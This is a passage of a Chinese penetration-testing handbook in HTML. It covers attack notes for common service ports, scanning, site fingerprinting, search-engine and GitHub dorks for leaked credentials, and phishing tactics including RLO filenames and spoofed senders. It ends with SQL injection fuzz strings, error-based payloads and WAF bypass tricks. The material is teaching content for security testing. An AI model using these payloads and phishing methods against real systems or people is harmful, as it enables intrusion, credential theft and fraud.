隧道</span></p></li></ul></li><li><h5 id='dhcp-6768'><span>DHCP 67/68</span></h5><ul><li><span>劫持/欺骗</span></li></ul></li><li><h5 id='tftp-69tcp'><span>TFTP (69/TCP)</span></h5></li><li><h5 id='http-80tcp'><span>HTTP (80/TCP)</span></h5></li><li><h5 id='kerberos-88tcp'><span>Kerberos (88/TCP)</span></h5><ul><li><span>主要用于监听 KDC 的票据请求</span></li><li><span>用于进行黄金票据和白银票据的伪造</span></li></ul></li><li><h5 id='pop3-110tcp'><span>POP3 (110/TCP)</span></h5><ul><li><span>爆破</span></li></ul></li><li><h5 id='rpc-135tcp'><span>RPC (135/TCP)</span></h5><ul><li><span>wmic 服务利用</span></li></ul></li><li><h5 id='netbios-137udp--138udp'><span>NetBIOS (137/UDP &amp; 138/UDP)</span></h5><ul><li><span>未授权访问</span></li><li><span>弱口令</span></li></ul></li><li><h5 id='netbios--samba-139tcp'><span>NetBIOS / Samba (139/TCP)</span></h5><ul><li><span>未授权访问</span></li><li><span>弱口令</span></li></ul></li><li><h5 id='snmp-161tcp'><span>SNMP (161/TCP)</span></h5><ul><li><span>Public 弱口令</span></li></ul></li><li><h5 id='ldap-389tcp'><span>LDAP (389/TCP)</span></h5><ul><li><span>用于域上的权限验证服务</span></li><li><span>匿名访问</span></li><li><span>注入</span></li></ul></li><li><h5 id='https-443tcp'><span>HTTPS (443/TCP)</span></h5></li><li><h5 id='smb-445tcp'><span>SMB (445/TCP)</span></h5><ul><li><span>Windows 协议簇，主要功能为文件共享服务</span></li><li><span>net use </span><span>\</span><span>\</span><span>192.168.1.1 /user:xxx</span><span>\</span><span>username password</span></li></ul></li><li><h5 id='linux-rexec-512tcp--513tcp--514tcp'><span>Linux Rexec (512/TCP &amp; 513/TCP &amp; 514/TCP)</span></h5><ul><li><span>弱口令</span></li></ul></li><li><h5 id='rsync-873tcp'><span>Rsync (873/TCP)</span></h5><ul><li><span>未授权访问</span></li></ul></li><li><h5 id='rpc-1025tcp'><span>RPC (1025/TCP)</span></h5><ul><li><span>NFS 匿名访问</span></li></ul></li><li><h5 id='java-rmi-1090tcp--1099tcp'><span>Java RMI (1090/TCP &amp; 1099/TCP)</span></h5><ul><li><span>反序列化远程命令执行漏洞</span></li></ul></li><li><h5 id='mssql-1433tcp'><span>MSSQL (1433/TCP)</span></h5><ul><li><span>弱密码</span></li><li><span>差异备份 GetShell</span></li><li><span>SA 提权</span></li></ul></li><li><h5 id='oracle-1521tcp'><span>Oracle (1521/TCP)</span></h5><ul><li><span>弱密码</span></li></ul></li><li><h5 id='nfs-2049tcp'><span>NFS (2049/TCP)</span></h5><ul><li><span>权限设置不当</span></li><li><span>showmount </span><span>&lt;</span><span>host</span><span>&gt;</span></li></ul></li><li><h5 id='zookeeper-2171tcp--2375tcp'><span>ZooKeeper (2171/TCP &amp; 2375/TCP)</span></h5><ul><li><span>无身份认证</span></li></ul></li><li><h5 id='docker-remote-api-2375tcp'><span>Docker Remote API (2375/TCP)</span></h5><ul><li><span>未限制 IP / 未启用 TLS 身份认证</span></li><li><a href='http://docker.addr:2375/version' target='_blank' class='url'>http://docker.addr:2375/version</a></li></ul></li><li><h5 id='mysql-3306tcp'><span>MySQL (3306/TCP)</span></h5><ul><li><span>弱密码</span></li><li><span>日志写 WebShell</span></li><li><span>UDF 提权</span></li><li><span>MOF 提权</span></li></ul></li><li><h5 id='rdp--terminal-services-3389tcp'><span>RDP / Terminal Services (3389/TCP)</span></h5><ul><li><span>弱密码</span></li></ul></li><li><h5 id='postgres-5432tcp'><span>Postgres (5432/TCP)</span></h5><ul><li><span>弱密码</span></li><li><span>执行系统命令</span></li></ul></li><li><h5 id='vnc-5900tcp'><span>VNC (5900/TCP)</span></h5><ul><li><span>弱密码</span></li></ul></li><li><h5 id='couchdb-5984tcp'><span>CouchDB (5984/TCP)</span></h5><ul><li><span>未授权访问</span></li></ul></li><li><h5 id='winrm-5985tcp'><span>WinRM (5985/TCP)</span></h5><ul><li><span>Windows 对 WS-Management 的实现</span></li><li><span>在 Vista 上需要手动启动，在 Windows Server 2008 中服务是默认开启的</span></li></ul></li><li><h5 id='redis-6379tcp'><span>Redis (6379/TCP)</span></h5><ul><li><span>无密码或弱密码</span></li><li><span>绝对路径写 WebShell</span></li><li><span>计划任务反弹 Shell</span></li><li><span>写 SSH 公钥</span></li><li><span>主从复制 RCE</span></li><li><span>Windows 写启动项</span></li></ul></li><li><h5 id='kubernetes-api-server-6443tcp--10250tcp'><span>Kubernetes API Server (6443/TCP &amp;&amp; 10250/TCP)</span></h5><ul><li><a href='https://Kubernetes:10250/pods' target='_blank' class='url'>https://Kubernetes:10250/pods</a></li></ul></li><li><h5 id='jdwp-8000tcp'><span>JDWP (8000/TCP)</span></h5><ul><li><span>远程命令执行</span></li></ul></li><li><h5 id='activemq-8061tcp'><span>ActiveMQ (8061/TCP)</span></h5></li><li><h5 id='jenkin-8080tcp'><span>Jenkin (8080/TCP)</span></h5><ul><li><span>未授权访问</span></li></ul></li><li><h5 id='elasticsearch-9200tcp'><span>Elasticsearch (9200/TCP)</span></h5><ul><li><span>代码执行</span></li><li><a href='http://es.addr:9200/' target='_blank' class='url'>http://es.addr:9200/</a><span>_</span><span>plugin/head/</span></li><li><a href='http://es.addr:9200/' target='_blank' class='url'>http://es.addr:9200/</a><span>_</span><span>nodes</span></li></ul></li><li><h5 id='memcached-11211tcp'><span>Memcached (11211/TCP)</span></h5><ul><li><span>未授权访问</span></li></ul></li><li><h5 id='rabbitmq-15672tcp--15692tcp--25672tcp'><span>RabbitMQ (15672/TCP &amp; 15692/TCP &amp; 25672/TCP)</span></h5></li><li><h5 id='mongodb-27017tcp'><span>MongoDB (27017/TCP)</span></h5><ul><li><span>无密码或弱密码</span></li></ul></li><li><h5 id='hadoop-50070tcp--50075tcp'><span>Hadoop (50070/TCP &amp; 50075/TCP)</span></h5><ul><li><span>未授权访问</span></li></ul></li></ul><blockquote><p><span>除了以上列出的可能出现的问题，暴露在公网上的服务若不是最新版，都可能存在已经公开的漏洞</span></p></blockquote><h3 id='332--常见端口扫描技术'><span>3.3.2  常见端口扫描技术</span></h3><h4 id='全扫描'><span>全扫描</span></h4><blockquote><p><span>扫描主机尝试使用三次握手与目标主机的某个端口建立正规的连接，若成功建立连接，则端口处于开放状态，反之处于关闭状态。</span></p><p><span>全扫描实现简单， 以较低的权限就可以进行该操作。但是在流量日志中会有大量明显的记录。</span></p></blockquote><h4 id='半扫描'><span>半扫描</span></h4><blockquote><p><span>半扫描也称 SYN 扫描，在半扫描中，仅发送 SYN 数据段，如果应答为 RST，则端口处于关闭状态，若应答为 SYN/ACK，则端口处于监听状态。不过这种方式需要较高的权限，而 现在的大部分防火墙已经开始对这种扫描方式做处理。</span></p></blockquote><h4 id='fin-扫描'><span>FIN 扫描</span></h4><blockquote><p><span>FIN 扫描是向目标发送一个 FIN 数据包，如果是开放的端口，会返回 RST 数据包，关闭的端口则不会返回数据包，可以通过这种方式来判断端口是否打开。</span></p><p><span>这种方式并不在 TCP 三次握手的状态中，所以不会被记录，相对 SYN 扫描要更隐蔽一些。</span></p></blockquote><h3 id='333--web-服务'><span>3.3.3  Web 服务</span></h3><ul><li><h5 id='jenkins'><span>Jenkins</span></h5><ul><li><span>未授权访问</span></li></ul></li><li><h5 id='gitlab'><span>Gitlab</span></h5><ul><li><span>对应版本 CVE</span></li></ul></li><li><h5 id='zabbix'><span>Zabbix</span></h5><ul><li><span>权限设置不当</span></li></ul></li></ul><h3 id='334--批量搜索'><span>3.3.4  批量搜索</span></h3><ul><li><span>Censys</span></li><li><span>Shodan</span></li><li><span>ZoomEye</span></li></ul><p>&nbsp;</p><h2 id='34--站点信息'><span>3.4  站点信息</span></h2><ul><li><h5 id='判断网站操作系统'><span>判断网站操作系统</span></h5><ul><li><span>Linux 大小写敏感</span></li><li><span>Windows 大小写不敏感</span></li></ul></li><li><h5 id='扫描敏感文件'><span>扫描敏感文件</span></h5><ul><li><span>robots.txt</span></li><li><span>crossdomain.xml</span></li><li><span>sitemap.xml</span></li><li><span>xx.tar.gz</span></li><li><span>xx.bak</span></li><li><span>等</span></li></ul></li><li><h5 id='确定网站采用的语言'><span>确定网站采用的语言</span></h5><ul><li><span>如 PHP / Java / Python 等</span></li><li><span>找后缀，比如 php/asp/jsp</span></li></ul></li><li><h5 id='前端框架'><span>前端框架</span></h5><ul><li><span>如 jQuery / BootStrap / Vue / React / Angular 等</span></li><li><span>查看源代码</span></li></ul></li><li><h5 id='中间服务器'><span>中间服务器</span></h5><ul><li><span>如 Apache / Nginx / IIS 等</span></li><li><span>查看 header 中的信息</span></li><li><span>根据报错信息判断</span></li><li><span>根据默认页面判断</span></li></ul></li><li><h5 id='web-容器服务器'><span>Web 容器服务器</span></h5><ul><li><span>如 Tomcat / Jboss / Weblogic 等</span></li></ul></li><li><h5 id='后端框架'><span>后端框架</span></h5><ul><li><p><span>根据 Cookie 判断</span></p></li><li><p><span>根据 CSS / 图片等资源的 hash 值判断</span></p></li><li><h5 id='根据-url-路由判断'><span>根据 URL 路由判断</span></h5><ul><li><span>如 wp-admin</span></li></ul></li><li><p><span>根据网页中的关键字判断</span></p></li><li><p><span>根据响应头中的 X-Powered-By</span></p></li></ul></li><li><h5 id='cdn-信息'><span>CDN 信息</span></h5><ul><li><span>常见的有 Cloudflare、yunjiasu</span></li></ul></li><li><h5 id='探测有没有-waf如果有什么类型的'><span>探测有没有 WAF，如果有，什么类型的</span></h5><ul><li><span>有 WAF，找绕过方式</span></li><li><span>没有，进入下一步</span></li></ul></li><li><h5 id='扫描敏感目录看是否存在信息泄漏'><span>扫描敏感目录，看是否存在信息泄漏</span></h5><ul><li><span>扫描之前先自己尝试几个的 url，人为看看反应</span></li></ul></li><li><h5 id='使用爬虫爬取网站信息'><span>使用爬虫爬取网站信息</span></h5></li><li><h5 id='拿到一定信息后通过拿到的目录名称文件名称及文件扩展名了解网站开发人员的命名思路确定其命名规则推测出更多的目录及文件名'><span>拿到一定信息后，通过拿到的目录名称，文件名称及文件扩展名了解网站开发人员的命名思路，确定其命名规则，推测出更多的目录及文件名</span></h5></li><li><h5 id='常见入口目标'><span>常见入口目标</span></h5><ul><li><span>关注度低的系统</span></li><li><span>业务线较长的系统</span></li></ul></li></ul><p>&nbsp;</p><h2 id='35--搜索引擎利用'><span>3.5  搜索引擎利用</span></h2><blockquote><p><span>恰当地使用搜索引擎（Google/Bing/Yahoo/Baidu 等）可以获取目标站点的较多信息。</span></p></blockquote><h3 id='351--搜索引擎处理流程'><span>3.5.1  搜索引擎处理流程</span></h3><ul><li><h5 id='数据预处理'><span>数据预处理</span></h5><ul><li><span>长度截断</span></li><li><span>大小写转化</span></li><li><span>去标点符号</span></li><li><span>简繁转换</span></li><li><span>数字归一化，中文数字、阿拉伯数字、罗马字</span></li><li><span>同义词改写</span></li><li><span>拼音改写</span></li></ul></li><li><h5 id='处理'><span>处理</span></h5><ul><li><span>分词</span></li><li><span>关键词抽取</span></li><li><span>非法信息过滤</span></li></ul></li></ul><h3 id='352--搜索技巧'><span>3.5.2  搜索技巧</span></h3><ul><li><h4 id='sitewwwhao123com'><a href='http://www.hao123.com/'><span>site:www.hao123.com</span></a></h4><ul><li><span>返回此目标站点被搜索引擎抓取收录的所有内容</span></li></ul></li><li><h4 id='sitewwwhao123com-keyword'><a href='http://www.hao123.com/'><span>site:www.hao123.com</span></a><span> keyword</span></h4><ul><li><span>返回此目标站点被搜索引擎抓取收录的包含此关键词的所有页面</span></li><li><span>此处可以将关键词设定为网站后台，管理后台，密码修改，密码找回等</span></li></ul></li><li><h4 id='sitewwwhao123com-inurladminphp'><a href='http://www.hao123.com/'><span>site:www.hao123.com</span></a><span> inurl:admin.php</span></h4><ul><li><span>返回目标站点的地址中包含 admin.php 的所有页面，可以使用 admin.php/manage.php 或者其他关键词来寻找关键功能页面</span></li></ul></li><li><h4 id='linkwwwhao123com'><a href='http://www.hao123.com/'><span>link:www.hao123.com</span></a></h4><ul><li><span>返回所有包含目标站点链接的页面，其中包括其开发人员的个人博客，开发日志，或者开放这个站点的第三方公司，合作伙伴等</span></li></ul></li><li><h4 id='relatedwwwhao123com'><a href='http://www.hao123.com/'><span>related:www.hao123.com</span></a></h4><ul><li><span>返回所有与目标站点</span>“<span>相似</span>”<span>的页面，可能会包含一些通用程序的信息等</span></li></ul></li><li><h4 id='intitle500-internal-server-error-server-at'><span>intitle:</span>“<span>500 Internal Server Error</span>”<span> </span>“<span>server at</span>”</h4><ul><li><span>搜索出错的页面</span></li></ul></li><li><h4 id='inurlnph-proxycgi-start-browsing'><span>inurl:</span>“<span>nph-proxy.cgi</span>”<span> </span>“<span>Start browsing</span>”</h4><ul><li><span>查找代理服务器</span></li></ul></li></ul><blockquote><p><span>除了以上的关键字，还有 allintile / allinurl / allintext / inanchor / intext / filetype / info / numberange / cache 等。</span></p></blockquote><h4 id='通配符-1'><span>通配符</span></h4><ul><li><span>*</span><span> 代表某一个单词</span></li><li><span>OR 或者 </span><span>|</span><span> 代表逻辑或</span></li><li><span>单词前跟 + 表强制查询</span></li><li><span>单词前跟 - 表排除对应关键字</span></li><li><span>&quot;</span><span> 强调关键字</span></li></ul><h4 id='tips'><span>tips</span></h4><ul><li><span>查询不区分大小写</span></li><li><span>括号会被忽略</span></li><li><span>默认用 and 逻辑进行搜索</span></li></ul><h3 id='353--快照'><span>3.5.3  快照</span></h3><blockquote><p><span>搜索引擎的快照中也常包含一些关键信息，如程序报错信息可以会泄漏网站具体路径，或者一些快照中会保存一些测试用的测试信息，比如说某个网站在开发了后台功能模块的时候，还没给所有页面增加权限鉴别，此时被搜索引擎抓取了快照，即使后来网站增加了权限鉴别，但搜索引擎的快照中仍会保留这些信息。</span></p><p><span>另外也有专门的站点快照提供快照功能，如 Wayback Machine 和 </span><a href='https://archive.org/'><span>Archive.org</span></a><span> 等。</span></p></blockquote><h3 id='354--github'><span>3.5.4  Github</span></h3><blockquote><p><span>在 Github 中，可能会存在源码泄露、AccessKey 泄露、密码、服务器配置泄露等情况，常见的搜索技巧有：</span></p></blockquote><ul><li><span>\@example.com password/pass/pwd/secret/credentials/token</span></li><li><span>\@example.com username/user/key/login/ftp/</span></li><li><span>\@example.com config/ftp/smtp/pop</span></li><li><span>\@example.com security_credentials/connetionstring</span></li><li><span>\@example.com JDBC/ssh2_auth_password/send_keys</span></li></ul><p>&nbsp;</p><h2 id='36--社会工程学'><span>3.6  社会工程学</span></h2><h3 id='363--企业信息收集'><span>3.6.3  企业信息收集</span></h3><blockquote><p><span>一些网站如天眼查等，可以提供企业关系挖掘、工商信息、商标专利、企业年报等信息查询，可以提供企业的较为细致的信息。</span></p><p><span>公司主站中会有业务方向、合作单位等信息。</span></p></blockquote><h3 id='362--人员信息收集'><span>3.6.2  人员信息收集</span></h3><blockquote><p><span>针对人员的信息收集考虑对目标重要人员、组织架构、社会关系的收集和分析。其中重要人员主要指高管、系统管理员、开发、运维、财务、人事、业务人员的个人电脑。</span></p><p><span>人员信息收集较容易的入口点是网站，网站中可能包含网站的开发、管理维护等人员的信息。从网站联系功能中和代码的注释信息中都可能得到的所有开发及维护人员的姓名和邮件地址及其他联系方式。</span></p><p><span>在获取这些信息后，可以在 Github/Linkedin 等社交、招聘网站中进一步查找这些人在互联网上发布的与目标站点有关的一切信息，分析并发现有用的信息。</span></p><p><span>此外，可以对获取到的邮箱进行密码爆破的操作，获取对应的密码。</span></p></blockquote><h3 id='363--钓鱼'><span>3.6.3  钓鱼</span></h3><blockquote><p><span>基于之前收集到的信息，可以使用 Office/CHM/RAR/EXE/快捷方式等文件格式制作钓鱼邮件发送至目标，进一步收集信息。</span></p><p><span>其中 Office 可以使用 Office 漏洞、宏、OLE 对象、PPSX 等方式构造利用文件。</span></p><p><span>Exe 可以使用特殊的 Unicode 控制字符如 RLO (Right-to-Left Override) 等来构建容易混淆的文件名。</span></p><p><span>RAR 主要是利用自解压等方式来构建恶意文件，同样加密的压缩包也在一定程度上可以逃逸邮件网关的检测。</span></p><p><span>如果前期信息收集获取到了运维等人员的邮箱，可以使用运维人员的邮箱发送，如果未收集到相关的信息，可以使用伪造发送源的方式发送邮件。</span></p><p><span>需要注意的是，钓鱼测试也需要注意合规问题，不能冒充监管单位、不能发送违法违规信息。具体可以参考</span></p><p><span>《中华人民共和国电信条例》、《中华人民共和国互联网电子邮件服务管理办法》等法律法规。</span></p></blockquote><h3 id='364--其他信息'><span>3.6.4  其他信息</span></h3><blockquote><p><span>公司的公众号、企业号、网站，员工的网盘、百度文库等可能会存在一些敏感信息，如 VPN/堡垒机账号、 TeamViewer 账号、网络设备默认口令、服务器默认口令等。</span></p></blockquote><h3 id='365--参考链接'><span>3.6.5  参考链接</span></h3><ul><li><a href='http://www.91ri.org/15441.html'><span>端口渗透总结</span></a></li><li><a href='https://paper.seebug.org/409'><span>未授权访问总结</span></a></li><li><a href='https://mp.weixin.qq.com/s/aatNjey3swZz7T4Yw_LqsQ'><span>红队测试之邮箱打点</span></a></li><li><a href='https://mp.weixin.qq.com/s/dqntjRLgcOD3D2bi1oDFAw'><span>邮件伪造之 SPF 绕过的 5 种思路</span></a></li></ul><p><span id="_bookmark25" class="anchor"></span><span>CHAPTER 4</span></p><p>&nbsp;</p><h1 id='4--常见漏洞攻防'><span>4.  常见漏洞攻防</span></h1><h2 id='41--sql-注入'><span>4.1  SQL 注入</span></h2><h3 id='411--注入分类'><span>4.1.1  注入分类</span></h3><h4 id='简介-9'><span>简介</span></h4><blockquote><p><span>SQL 注入是一种代码注入技术，用于攻击数据驱动的应用程序。在应用程序中，如果没有做恰当的过滤，则可能使得恶意的 SQL 语句被插入输入字段中执行（例如将数据库内容转储给攻击者）。</span></p></blockquote><h4 id='按技巧分类'><span>按技巧分类</span></h4><blockquote><p><span>根据使用的技巧，SQL 注入类型可分为</span></p></blockquote><ul><li><h5 id='盲注'><span>盲注</span></h5><ul><li><span>布尔盲注：只能从应用返回中推断语句执行后的布尔值</span></li><li><span>时间盲注：应用没有明确的回显，只能使用特定的时间函数来判断</span></li></ul></li><li><p><span>报错注入：应用会显示全部或者部分的报错信息</span></p></li><li><p><span>堆叠注入：有的应用可以加入 ; 后一次执行多条语句</span></p></li><li><p><span>其他</span></p></li></ul><h4 id='按获取数据的方式分类'><span>按获取数据的方式分类</span></h4><blockquote><p><span>另外也可以根据获取数据的方式分为 3 类</span></p></blockquote><h5 id='inband'><span>inband</span></h5><blockquote><p><span>利用 Web 应用来直接获取数据，如报错注入，这类注入都是通过站点的响应或者错误反馈来提取数据。</span></p></blockquote><h5 id='inference'><span>inference</span></h5><blockquote><p><span>通过 Web 的一些反映来推断数据，如布尔盲注，也就是我们通俗的盲注，通过 web 应用的其他改变来推断数据。</span></p></blockquote><h5 id='out-of-band-oob'><span>out of band (OOB)</span></h5><blockquote><p><span>通过其他传输方式来获得数据，比如 DNS 解析协议和电子邮件。</span></p></blockquote><h3 id='412--注入检测'><span>4.1.2  注入检测</span></h3><h4 id='常见的注入点'><span>常见的注入点</span></h4><ul><li><span>GET/POST/PUT/DELETE 参数</span></li><li><span>X-Forwarded-For</span></li><li><span>文件名</span></li></ul><h4 id='fuzz-注入点'><span>Fuzz 注入点</span></h4><ul><li><p><span>&#39;</span><span> / </span><span>&quot;</span></p></li><li><p><span>1/1</span></p></li><li><p><span>1/0</span></p></li><li><p><span>and 1=1</span></p></li><li><p><span>&quot;</span><span> and </span><span>&quot;</span><span>1</span><span>&quot;</span><span>=</span><span>&quot;</span><span>1</span></p></li><li><p><span>and 1=2</span></p></li><li><p><span>or 1=1</span></p></li><li><p><span>or 1=</span></p></li><li><p><span>&#39;</span><span> and </span><span>&#39;</span><span>1</span><span>&#39;</span><span>=</span><span>&#39;</span><span>1</span></p></li><li><ul><li><span>\^ </span><span>*</span><span> % /</span></li></ul></li><li><p><span>&lt;</span><span>&lt;</span><span> </span><span>&gt;</span><span>&gt;</span><span> </span><span>|</span><span>|</span><span> </span><span>|</span><span> &amp; &amp;&amp;</span></p></li><li><p><span>~</span></p></li><li><p><span>!</span></p></li><li><p><span>@</span></p></li><li><p><span>反引号执行</span></p></li></ul><h4 id='测试用常量'><span>测试用常量</span></h4><ul><li><span>@@version</span></li><li><span>@@servername</span></li><li><span>@@language</span></li><li><span>@@spid</span></li></ul><h4 id='测试列数'><span>测试列数</span></h4><blockquote><p><span>例如 </span><a href='http://www.foo.com/index.asp?id=12%2Bunion%2Bselect%2Bnull%2Cnull--'><span>http://www.foo.com/index.asp?id=12+union+select+null,null</span><span>-</span><span>-</span></a><span> ，不断增加 null 至不返回</span></p></blockquote><h4 id='报错注入-1'><span>报错注入</span></h4><ul><li><span>select 1/0</span></li><li><span>select 1 from (select count(</span><span>*</span><span>),concat(version(),floor(rand(0)</span><span>*</span><span>2))x from information_schema.tables group by x)a</span></li><li><span>extractvalue(1, concat(0x5c,(select user())))</span></li><li><span>updatexml(0x3a,concat(1,(select user())),1)</span></li><li><span>exp(</span><span>~</span><span>(SELECT </span><span>*</span><span> from(select user())a))</span></li><li><span>ST_LatFromGeoHash((select </span><span>*</span><span> from(select </span><span>*</span><span> from(select user())a)b))</span></li><li><span>GTID_SUBSET(version(), 1)</span></li></ul><h4 id='基于-geometric-的报错注入'><span>基于 geometric 的报错注入</span></h4><ul><li><span>GeometryCollection((select </span><span>*</span><span> from (select </span><span>*</span><span> from(select user())a)b))</span></li><li><span>polygon((select </span><span>*</span><span> from(select </span><span>*</span><span> from(select user())a)b))</span></li><li><span>multipoint((select </span><span>*</span><span> from(select </span><span>*</span><span> from(select user())a)b))</span></li><li><span>multilinestring((select </span><span>*</span><span> from(select </span><span>*</span><span> from(select user())a)b))</span></li><li><span>LINESTRING((select </span><span>*</span><span> from(select </span><span>*</span><span> from(select user())a)b))</span></li><li><span>multipolygon((select </span><span>*</span><span> from(select </span><span>*</span><span> from(select user())a)b))</span></li></ul><blockquote><p><span>其中需要注意的是，基于 exp 函数的报错注入在 MySQL 5.5.49 后的版本已经不再生效，具体可以参考这个</span></p><p><a href='https://github.com/mysql/mysql-server/commit/95825fa28a7e84a2f5dbdef5241078f7055c5b04'><span>commit 95825f</span></a><span> 。</span></p><p><span>而以上列表中基于 geometric 的报错注入在这个 </span><a href='https://github.com/mysql/mysql-server/commit/5caea4a995130cd7c82574acc591ff7c46d9d978'><span>commit 5caea4</span></a><span> 中被修复，在 5.5.x 较后的版本中同样不再生效。</span></p></blockquote><h4 id='堆叠注入'><span>堆叠注入</span></h4><ul><li><span>;select 1</span></li></ul><h4 id='注释符'><span>注释符</span></h4><ul><li><span>#</span></li><li><span>-</span><span>-+</span></li><li><span>/</span><span>*</span><span>xxx</span><span>*</span><span>/</span></li><li><span>/</span><span>*</span><span>!xxx</span><span>*</span><span>/</span></li><li><span>/</span><span>*</span><span>!50000xxx</span><span>*</span><span>/</span></li></ul><h4 id='判断过滤规则'><span>判断过滤规则</span></h4><ul><li><span>是否有 trunc</span></li><li><span>是否过滤某个字符</span></li><li><span>是否过滤关键字</span></li><li><span>slash 和编码</span></li></ul><h4 id='获取信息'><span>获取信息</span></h4><ul><li><p><strong><span>判断数据库类型</span></strong></p><ul><li><span>and exists (select </span><span>*</span><span> from msysobjects ) </span><span>&gt;</span><span> 0 access 数据库</span></li><li><span>and exists (select </span><span>*</span><span> from sysobjects ) </span><span>&gt;</span><span> 0 SQLServer 数据库</span></li></ul></li><li><h5 id='判断数据库表'><span>判断数据库表</span></h5><ul><li><span>and exsits (select </span><span>*</span><span> from admin)</span></li></ul></li><li><h6 id='版本主机名用户名库名'><span>版本、主机名、用户名、库名</span></h6></li><li><h5 id='表和字段'><span>表和字段</span></h5><ul><li><strong><span>确定字段数</span></strong></li><li><span>Order By</span></li><li><span>Select Into</span></li></ul></li><li><p><span>表名、列名</span></p></li></ul><h4 id='测试权限'><span>测试权限</span></h4><ul><li><p><strong><span>文件操作</span></strong></p><ul><li><span>读敏感文件</span></li><li><span>写 shell</span></li></ul></li><li><h5 id='带外通道'><span>带外通道</span></h5><ul><li><span>网络请求</span></li></ul></li></ul><h3 id='413--权限提升'><span>4.1.3  权限提升</span></h3><h4 id='udf-提权'><span>UDF 提权</span></h4><blockquote><p><span>UDF（User Defined Function，用户自定义函数）是 MySQL 提供的一个功能，可以通过编写 DLL 扩展为</span></p><p><span>MySQL 添加新函数，扩充其功能。</span></p><p><span>当获得 MySQL 权限之后，即可通过这种方式上传自定义的扩展文件，从 MySQL 中执行系统命令。</span></p></blockquote><h3 id='414--数据库检测'><span>4.1.4  数据库检测</span></h3><h4 id='mysql-1'><span>MySQL</span></h4><ul><li><p><span>sleep sleep(1)</span></p></li><li><p><span>benchmark BENCHMARK(5000000, MD5(</span><span>&#39;</span><span>test</span><span>&#39;</span><span>))</span></p></li><li><h5 id='字符串连接-1'><span>字符串连接</span></h5><ul><li><span>SELECT </span><span>&#39;</span><span>a</span><span>&#39;</span><span> </span><span>&#39;</span><span>b</span><span>&#39;</span></li><li><span>SELECT CONCAT(</span><span>&#39;</span><span>some</span><span>&#39;</span><span>,</span><span>&#39;</span><span>string</span><span>&#39;</span><span>)</span></li></ul></li><li><h5 id='version-2'><span>version</span></h5><ul><li><span>SELECT @@version</span></li><li><span>SELECT version()</span></li></ul></li><li><h5 id='识别用函数'><span>识别用函数</span></h5><ul><li><span>connection_id()</span></li><li><span>last_insert_id()</span></li><li><span>row_count()</span></li></ul></li></ul><h4 id='oracle'><span>Oracle</span></h4><ul><li><h5 id='字符串连接-2'><span>字符串连接</span></h5><ul><li><h5 id='aoracle---'>’<span>a</span><span>&#39;</span><span>|</span><span>|</span><span>&#39;</span><span>oracle</span><span>&#39;</span><span> </span><span>-</span><span>-</span></h5></li><li><h5 id='select-concatsomestring'><span>SELECT CONCAT(</span><span>&#39;</span><span>some</span><span>&#39;</span><span>,</span><span>&#39;</span><span>string</span><span>&#39;</span><span>)</span></h5></li></ul></li><li><h5 id='version-3'><span>version</span></h5><ul><li><span>SELECT banner FROM v</span><span>$</span><span>version</span></li><li><span>SELECT banner FROM v</span><span>$</span><span>version WHERE rownum=1</span></li></ul></li></ul><h4 id='sqlserver'><span>SQLServer</span></h4><ul><li><p><span>WAITFOR WAITFOR DELAY </span><span>&#39;</span><span>00:00:10</span><span>&#39;</span><span>;</span></p></li><li><p><span>SERVERNAME SELECT @@SERVERNAME</span></p></li><li><p><span>version SELECT @@version</span></p></li><li><h5 id='字符串连接-3'><span>字符串连接</span></h5><ul><li><span>SELECT </span><span>&#39;</span><span>some</span><span>&#39;</span><span>+</span><span>&#39;</span><span>string</span><span>&#39;</span></li></ul></li><li><h5 id='常量'><span>常量</span></h5><ul><li><span>@@pack_received</span></li><li><span>@@rowcount</span></li></ul></li></ul><h4 id='postgresql'><span>PostgreSQL</span></h4><ul><li><span>sleep pg_sleep(1)</span></li></ul><h3 id='415--绕过技巧'><span>4.1.5  绕过技巧</span></h3><ul><li><h5 id='编码绕过'><span>编码绕过</span></h5><ul><li><span>大小写</span></li><li><span>url 编码</span></li><li><span>html 编码</span></li><li><span>十六进制编码</span></li></ul></li><li><h5 id='注释-1'><span>注释</span></h5><ul><li><span>unicode 编码</span></li><li><span>// </span><span>-</span><span>- </span><span>-</span><span>- + </span><span>-</span><span>- - </span><span>#</span><span> /</span><span>*</span><span>*</span><span>/ ;%00</span></li><li><span>内联注释用的更多，它有一个特性 /!</span><span>*</span><span>*</span><span>/ 只有 MySQL 能识别</span></li><li><span>e.g. index.php?id=-1 /</span><span>*</span><span>!UNION</span><span>*</span><span>/ /</span><span>*</span><span>!SELECT</span><span>*</span><span>/ 1,2,3</span></li></ul></li><li><h5 id='只过滤了一次时'><span>只过滤了一次时</span></h5><ul><li><span>union =</span><span>&gt;</span><span> ununionion</span></li></ul></li><li><h5 id='相同功能替换'><span>相同功能替换</span></h5><ul><li><h5 id='函数替换'><span>函数替换</span></h5><ul><li><span>substring / mid / sub</span></li><li><span>ascii / hex / bin</span></li><li><span>benchmark / sleep</span></li></ul></li><li><h5 id='变量替换'><span>变量替换</span></h5><ul><li><span>user() / @@user</span></li></ul></li><li><h5 id='符号和关键字'><span>符号和关键字</span></h5><ul><li><span>and / &amp;</span></li><li><span>or / </span><span>|</span></li></ul></li></ul></li><li><h5 id='http-参数'><span>HTTP 参数</span></h5><ul><li><h5 id='http-参数污染'><span>HTTP 参数污染</span></h5><ul><li><span>id=1&amp;id=2&amp;id=3 根据容器不同会有不同的结果</span></li></ul></li><li><p><span>HTTP 分割注入</span></p></li></ul></li><li><h5 id='缓冲区溢出'><span>缓冲区溢出</span></h5><ul><li><span>一些 C 语言的 WAF 处理的字符串长度有限，超出某个长度后的 payload 可能不会被处理</span></li></ul></li><li><h5 id='二次注入有长度限制时通过多句执行的方法改掉数据库该字段的长度绕过'><span>二次注入有长度限制时，通过多句执行的方法改掉数据库该字段的长度绕过</span></h5></li></ul><h3 id='416--sql-注入小技巧'><span>4.1.6  SQL 注入小技巧</span></h3><h4 id='宽字节注入'><span>宽字节注入</span></h4><ul><li><span>一般程序员用 gbk 编码做开发的时候，会用 set names </span><span>&#39;</span><span>gbk</span><span>&#39;</span><span> 来设定，这句话等同于</span></li></ul><pre class="md-fences md-end-block md-fences-with-lineno ty-contain-cm modeLoaded" spellcheck="false" lang="sql"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="sql"><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.33333px; left: 36px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div 